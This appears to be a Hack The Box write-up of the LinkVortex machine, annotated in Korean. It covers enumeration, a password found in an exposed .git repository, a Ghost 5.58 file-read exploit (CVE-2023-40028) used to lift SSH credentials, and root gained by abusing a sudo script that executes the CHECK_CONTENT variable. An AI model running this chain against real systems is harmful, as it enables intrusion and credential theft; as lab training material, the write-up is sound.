---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/lin/sudo-abuse
  - tech/enum/dirbust
type: machine
platform: htb
os: linux
ip: 10.129.231.194
domain: linkvortex.htb
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2023-40028]
status: solved
tech_count: 2
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.231.194 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 18:07 +0900
Nmap scan report for 10.129.231.194
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   229.51 ms 10.10.14.1
2   229.74 ms 10.129.231.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.49 seconds

```

hosts 파일 세팅
```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ cat /etc/hosts       
10.129.231.194  linkvortex.htb

```

서브도메인 탐색

```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ gobuster vhost -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -r -t 100
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://linkvortex.htb
[+] Method:                    GET
[+] Threads:                   100
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.linkvortex.htb Status: 200 [Size: 2538]
#www.linkvortex.htb Status: 400 [Size: 226]
#mail.linkvortex.htb Status: 400 [Size: 226]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================


```


dev.linkvortex.htb 하위 디렉토리 탐색

```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ feroxbuster -u http://dev.linkvortex.htb -s 200 -t 1000 -w /usr/share/seclists/Discovery/Web-Content/common.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.linkvortex.htb/
 🚩  In-Scope Url          │ dev.linkvortex.htb
 🚀  Threads               │ 1000
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
200      GET        8l       21w      201c http://dev.linkvortex.htb/.git/config
200      GET        1l        1w       41c http://dev.linkvortex.htb/.git/HEAD
200      GET      115l      255w     2538c http://dev.linkvortex.htb/index.html
200      GET       15l       53w      868c http://dev.linkvortex.htb/.git/logs/
200      GET     2172l     8158w   958396c http://dev.linkvortex.htb/.git/index
200      GET        1l        9w      175c http://dev.linkvortex.htb/.git/logs/HEAD
200      GET       49l      279w     1643c http://dev.linkvortex.htb/.git/hooks/pre-commit.sample
200      GET        8l       32w      189c http://dev.linkvortex.htb/.git/hooks/post-update.sample
200      GET       14l       69w      424c http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample
200      GET       24l      163w      896c http://dev.linkvortex.htb/.git/hooks/commit-msg.sample
200      GET       24l       83w      544c http://dev.linkvortex.htb/.git/hooks/pre-receive.sample
200      GET       42l      238w     1492c http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample
200      GET      173l      669w     4655c http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample
200      GET      169l      798w     4898c http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample
200      GET       78l      499w     2783c http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample
200      GET      128l      546w     3650c http://dev.linkvortex.htb/.git/hooks/update.sample
200      GET       53l      234w     1374c http://dev.linkvortex.htb/.git/hooks/pre-push.sample
200      GET       15l       79w      478c http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample
200      GET       13l       67w      416c http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample
200      GET        6l       43w      240c http://dev.linkvortex.htb/.git/info/exclude
[####################] - 17s    14312/14312   0s      found:21      errors:1724   
[####################] - 9s      4751/4751    520/s   http://dev.linkvortex.htb/ 
[####################] - 15s     4751/4751    322/s   http://dev.linkvortex.htb/.git/ 
[####################] - 15s     4751/4751    322/s   http://dev.linkvortex.htb/.git/logs/ 
[####################] - 1s      4751/4751    4970/s  http://dev.linkvortex.htb/.git/hooks/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4751/4751    4970/s  http://dev.linkvortex.htb/.git/info/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s      4751/4751    10239/s http://dev.linkvortex.htb/.git/objects/ => Directory listing (add --scan-dir-listings to scan)       

```

git 레포지토리에서 비밀번호 추출출

```bash
grep -i -r -E "password *[:=] *'"

ghost/core/test/regression/api/content/pages.test.js:            password: hashedPassword,
ghost/core/test/regression/api/content/pages.test.js:        const res = await request.get(localUtils.API.getApiQuery(`pages/?key=${key}&filter=authors.password:'${hashedPassword}'`))
ghost/core/test/regression/api/content/pages.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
ghost/core/test/regression/api/content/pages.test.js:            password: hashedPassword,
ghost/core/test/regression/api/content/posts.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
ghost/core/test/regression/api/content/posts.test.js:            password: hashedPassword,
ghost/core/test/regression/api/content/posts.test.js:        const res = await request.get(localUtils.API.getApiQuery(`posts/?key=${validKey}&filter=authors.password:'${hashedPassword}'`))
ghost/core/test/regression/api/content/posts.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
ghost/core/test/regression/api/content/posts.test.js:            password: hashedPassword,
ghost/core/test/regression/api/content/authors.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
ghost/core/test/regression/api/content/authors.test.js:            password: hashedPassword,
ghost/core/test/regression/api/content/authors.test.js:        const res = await request.get(localUtils.API.getApiQuery(`authors/?key=${validKey}&filter=password:'${hashedPassword}'`))
ghost/core/test/regression/api/content/authors.test.js:        const hashedPassword = '$2a$10$FxFlCsNBgXw42cBj0l1GFu39jffibqTqyAGBz7uCLwetYAdBYJEe6';
ghost/core/test/regression/api/content/authors.test.js:            password: hashedPassword,
ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';
ghost/core/test/regression/api/admin/authentication.test.js:                        password: 'thisissupersafe',
ghost/core/test/regression/api/admin/authentication.test.js:                        password: 'thisissupersafe',
ghost/core/test/regression/api/admin/authentication.test.js:            const password = 'thisissupersafe';

```

웹 서비스 로그인
![[Pasted image 20260313130820.png]]

웹 서비스 확인
```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ whatweb http://linkvortex.htb                
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.129.231.194], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]

```


ghost 5.58 버전 CVE 다운로드
https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git

```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git
Cloning into 'Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 20 (delta 3), reused 9 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (20/20), 8.38 KiB | 8.38 MiB/s, done.
Resolving deltas: 100% (3/3), done.

```

Dockerfile.ghost파일에서 config.production.json 파일 경로 확인,
/var/lib/ghost/config.production.json    조회회

```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit):  /var/lib/ghost/config.production.json    
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}


```


자격 증명 사용하여 ssh 접근`bob@linkvortex.htb / fibber-talented-worth`
```bash
┌──(kali㉿kali)-[~/HTB/LinkVortex]
└─$ ssh bob@10.129.231.194                                   
The authenticity of host '10.129.231.194 (10.129.231.194)' can't be established.
ED25519 key fingerprint is: SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.194' (ED25519) to the list of known hosts.
bob@10.129.231.194's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ 

```

user.txt 획득
![[Pasted image 20260313132007.png]]


sudo 권한 확인
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

sh 파일 확인
```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

if [ -z $CHECK_CONTENT ];then 부분에서는 CHECK_CONTENT변수의존재여부만확인할뿐값의내용을검증하지않는다.따라서CHECK_CONTENT에 명령어를 삽입하면 if $CHECK_CONTENT;then 부분에서 해당 명령어가 root 권한으로 실행된다.
```bash
bob@linkvortex:~$ ln -s a.png
bob@linkvortex:~$ export CHECK_CONTENT=/bin/bash
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ a.png ] , moving it to quarantine
root@linkvortex:/home/bob# 

```

root.txt 획득
```bash
root@linkvortex:/home/bob# cat /root/root.txt
34461a52b941d538b9d4ada1c03699b5
root@linkvortex:/home/bob# ifconfig
br-8c05bd48413a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:9e:68:96:26  txqueuelen 0  (Ethernet)
        RX packets 82917  bytes 77360734 (77.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 82013  bytes 10356676 (10.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:2e:6a:eb:9e  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.231.194  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:94:b0:1f  txqueuelen 1000  (Ethernet)
        RX packets 252278  bytes 22829853 (22.8 MB)

```
